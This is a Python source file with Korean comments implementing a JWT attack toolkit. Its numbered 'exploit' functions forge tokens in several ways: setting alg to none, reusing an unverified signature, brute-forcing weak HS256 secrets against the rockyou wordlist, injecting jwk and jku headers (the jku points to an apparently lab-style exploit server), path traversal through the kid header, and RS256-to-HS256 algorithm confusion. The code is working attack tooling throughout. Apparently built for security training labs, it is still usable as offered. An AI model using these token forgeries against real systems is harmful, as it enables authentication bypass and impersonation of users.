### **1. 공통 모듈**

import jwt, json, base64, sys, subprocess
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from jwcrypto import jwk
import jwt_forgery
import binascii
import asn1tools
import time
import hmac
import hashlib
import copy #none alg 수정

"""1.1. 토큰 디코딩 함수
- header, payload, signature 복호화 & 출력 & return
"""

python_interpreter = sys.executable
# 전역 변수로 공개 키와 kid를 저장
cached_public_key = None
cached_kid = None

def decode_jwt(token):
  #print(f"JWT: {token}")

  #print("----------------------------------------------------------------------------------------------------------------------------------------------------------------")

  header, payload, signature = token.split('.')

  #print(f"Origin Header: {header}")
  #print(f"Origin Payload: {payload}")
  #print(f"Origin Signature: {signature}")

  #print("----------------------------------------------------------------------------------------------------------------------------------------------------------------")

  decoded_header = jwt.get_unverified_header(token)
  decoded_payload = jwt.decode(token, options={"verify_signature": False})

  #print(f"Header: {decoded_header}")
  #print(f"Payload: {decoded_payload}")

  return decoded_header, decoded_payload, signature

def decode_str(token):
  if token is not None:
    decoded_header = jwt.get_unverified_header(token)
    decoded_payload = jwt.decode(token, options={"verify_signature": False})
    return str(decoded_header) + "\n" + str(decoded_payload)

"""1.2. 토큰 만들어주는 함수
- 파라미터로 전달해주는 header, payload, secret으로 토큰 인코딩
"""

def create_jwt(header, payload, secret=None, signature=None):
  algorithm = header.get('alg')
  created_token = ''

  # signature를 파라미터로 준다면 signing 하지 않고, sinature 그대로 사용
  if signature != None:
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    created_token = f"{encoded_header}.{encoded_payload}.{signature}"

  # algorithn이 none이라면 signature 없이 header, payload만 base64로 인코딩해서 토큰 생성
  elif algorithm.lower() == 'none':
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    created_token = f"{encoded_header}.{encoded_payload}."

  # header의 알고리즘에 따라 토큰 생성
  elif algorithm == 'RS256':
    private_key = secret
    created_token = jwt.encode(payload, private_key, algorithm=algorithm, headers=header)
  elif algorithm == 'HS256':
    created_token = jwt.encode(payload, secret, algorithm=algorithm, headers=header)

  return created_token

"""1.3. 토큰 검증해주는 함수
- return 값: True, False
"""

def verify_jwt(token, secret):
  try:
    algorithm = jwt.get_unverified_header(token).get('alg')
    decoded_payload = jwt.decode(token, secret, algorithms=[algorithm])
    return True

  except jwt.InvalidSignatureError:
    return False

"""1.4. 토큰 입력받는 함수"""

def input_jwt():
  token = input("토큰을 입력하세요: ")
  return token

"""1.5. 사용자의 입력값에 따라 header, payload, signature 변조해주는 함수
- while 문으로 'exit'을 입력할 때까지 사용자의 입력값을 받음
"""

def modify_data(header, payload, signature):
    print("Enter modifications in the format '0, variable_name, value' for header or '1, variable_name, value' for payload.")
    print("Enter 'exit' to finish modifications.")

    while True:
        user_input = input("ex) 0, variable_name, value\n")

        if user_input.lower() == 'exit':
            break

        try:
            part, key, value = [x.strip() for x in user_input.split(',', 2)]
            #print(part, type(part), key, type(key), value, type(value))
            part = int(part)

            if part == 0:
                header[key] = value
            elif part == 1:
                payload[key] = value
            else:
                print("Invalid part number. Use 0 for header and 1 for payload.")

        except ValueError:
            print("Invalid input format. Please enter the input in the correct format.")
        except TypeError:
            print("Error in modifying the data. Please ensure correct types are provided.")
    print("Result: ", header, payload, signature)
    return header, payload, signature

"""1.6. 파일 읽기"""

def read_file(file_path):
  with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
    return [line.strip() for line in file]

"""1.7. secret 찾기 (대칭키 알고리즘)"""

def origin_fuzz_secret(token, file_path="./rockyou.txt"):
  algorithm = jwt.get_unverified_header(token).get('alg')
  
  if algorithm != 'HS256': # 대칭키가 아닌 경우 해당사항 없음
    return print("Not Symmetric Algorithm")
    
  secrets = read_file(file_path)

  for secret in secrets:
    try:
      jwt.decode(token, secret, algorithms=[algorithm])
      return secret
    except jwt.InvalidTokenError:
      continue
  return None


def fuzz_secret(token, file_path="./rockyou.txt"):
  algorithm = jwt.get_unverified_header(token).get('alg')

  if algorithm != 'HS256': # 대칭키가 아닌 경우 해당사항 없음
    return print("Not Symmetric Algorithm")

  with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
    for line in file:
      secret = line.strip()
      try:
        jwt.decode(token, secret, algorithms=[algorithm])
        return secret
      except jwt.InvalidTokenError:
        continue
    return None


"""1.8. RSA 키 로드 함수"""

def load_private_key(file_path='private_key.pem'):
  with open(file_path, 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
  return private_key

def load_public_key(file_path='public_key.pem'):
  with open(file_path, 'rb') as f:
    public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
  return public_key

def generate_kid(public_key): #generate kid
    public_numbers = public_key.public_numbers()
    public_bytes = public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, byteorder='big')
    kid = hashlib.sha256(public_bytes).hexdigest()
    return kid

def get_cached_jwk(): #cache된 public key, kid 가져오기
    global cached_public_key, cached_kid
    if cached_public_key is None or cached_kid is None:
        cached_public_key = load_public_key()
        cached_kid = generate_kid(cached_public_key)
    return cached_public_key, cached_kid

"""1.9 공개키 만들기
```
# 2048비트 RSA 개인키 생성
openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

# 공개키 추출
openssl rsa -pubout -in private_key.pem -out public_key.pem
```
"""

def create_rsa_key():
  private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
  )

  with open('private_key.pem', 'wb') as f:
    f.write(private_key.private_bytes(
      encoding=serialization.Encoding.PEM,
      format=serialization.PrivateFormat.TraditionalOpenSSL,
      encryption_algorithm=serialization.NoEncryption()
    ))

  public_key = private_key.public_key()
  with open('public_key.pem', 'wb') as f:
    f.write(public_key.public_bytes(
      encoding=serialization.Encoding.PEM,
      format=serialization.PublicFormat.SubjectPublicKeyInfo
    ))
  return

"""1.10 공개키를 JWK 형식으로 변환"""

def pem_to_jwk(public_key, kid=None):
  public_numbers = public_key.public_numbers()
  e = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
  n = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
  
  jwk = {
      "kty": "RSA",
      "n": n,
      "e": e,
  }
  if kid: jwk["kid"] = kid
  
  return json.dumps(jwk, indent=2)


"""1.11. 공개키 찾기 (비대칭키 알고리즘)"""

def input_jwt_ex5():
  jwt0 = input("첫번째 토큰을 입력하세요: ")
  jwt1 = input("두번째 토큰을 입력하세요: ")
  return jwt0, jwt1

    
"""### **2. 세부 모듈**

2.1. none_algorithm
 - signature를 생성하지 않음
 - header의 "alg"을 "none"으로 변조
"""

def exploit1(header, payload):
  # 문제; 객체 참조가 돼서 같은 객체를 가리키게 됨. ex_header = header
  
  ex_header = copy.deepcopy(header)
  ex_header["alg"] = "none" #알고리즘 none으로 변경
  modifiedToken = create_jwt(ex_header, payload) #변조한 토큰 생성
  return modifiedToken

""" 2.2. unverified_signature
 - 토큰을 decode()만 하고 verify() 하지 않는 경우
 - signature를 그대로 사용
"""

def exploit2(header, payload, signature):
  modifiedToken = create_jwt(header, payload, signature=signature) #변조한 토큰 생성
  return modifiedToken

"""2.3. weak secret
- **대칭키 알고리즘 (HS256)** 사용 시 가능
- bruteforcing 기법 = fuzz_secret()
"""

def exploit3(header, payload, secret): 
    
  #if secret is None: # secret을 못찾았을 경우 취약하지 않음
    #return "Not Using Weak Secert\n"

  modifiedToken = create_jwt(header, payload, secret) #변조한 토큰 생성
  return modifiedToken

"""2.4. jwt header injection  
$\qquad$1) jwk header  
$\qquad$2) jku header  
$\qquad$3) kid header  
"""

def exploit4_1(header, payload):
  public_key = load_public_key()
  try:
    jwk = json.loads(pem_to_jwk(public_key, header['kid']))
  except:
    jwk = json.loads(pem_to_jwk(public_key))

  ex_header = copy.deepcopy(header)
  ex_header['jwk'] = jwk
  ex_header['alg'] = 'RS256'

  private_key = load_private_key()
  modifiedToken = create_jwt(ex_header, payload, private_key) #변조한 토큰 생성
  return modifiedToken
  
  
def exploit4_2(header, payload):
    if header['alg'] == 'HS256': # 대칭키는 해당사항 없음// 대칭키ㅁ도 되나?
        return None
    
    # 공개 키와 kid 캐싱
    public_key, kid = get_cached_jwk()

    #jku header 변조
    ex_header = copy.deepcopy(header)
    ex_header['jku'] = 'https://exploit-0a9d007803ff6d32803384d3010800b9.exploit-server.net/jwks.json'#'http://43.201.70.20:5000/jwks.json'
    ex_header['kid'] = kid
    
    private_key = load_private_key()
    modifiedToken = create_jwt(ex_header, payload, private_key) #변조한 토큰 생성
    return modifiedToken


def exploit4_3(header, payload):
  if header['alg'] == 'RS256': # 비대칭키는 해당사항 없음
    return None
    
  ex_header = copy.deepcopy(header)
  ex_header['kid'] = '../../../../../dev/null'
  modifiedToken = create_jwt(ex_header, payload, '') #변조한 토큰 생성
  return modifiedToken

"""2.5. algorithm confusion
- header의 alg를 비대칭키 에서 대칭키로 변조 (ex. RS256 -> HS256)
- RS256의 공개키 찾기 = jwt-forgery.py
- 4개 토큰 중 유효한 토큰 사용자 입력 필요
- 유효한 토큰은 mpayload로 다시 토큰 생성 필요
"""

def exploit5(jwt0, jwt1, mpayload):
  # Run the jwt_forgery script with the provided JWTs
  try:
      result = subprocess.run(
              [python_interpreter, "jwt_forgery.py", jwt0, jwt1,mpayload], # 주의) 같은 가상환경 인터프리터로 지정해줘야 함
              capture_output=True,
              text=True,
              check=True #에러 발생시 CalledProcessError 예외가 발생
              )
      # Print the output of the jwt_forgery script
      print('exploit5 Finish!!')
      result = result.stdout
      lines = result.strip().split('\n')
      print(lines)
      index_jwts = lines.index('jwts')
      index_tjwts = lines.index('tjwts')
      return lines[index_jwts+1:index_tjwts], lines[index_tjwts+1:]

  except subprocess.CalledProcessError as e:
      print("Error:", e.stderr, file=sys.stderr)
      return None, None
  
  
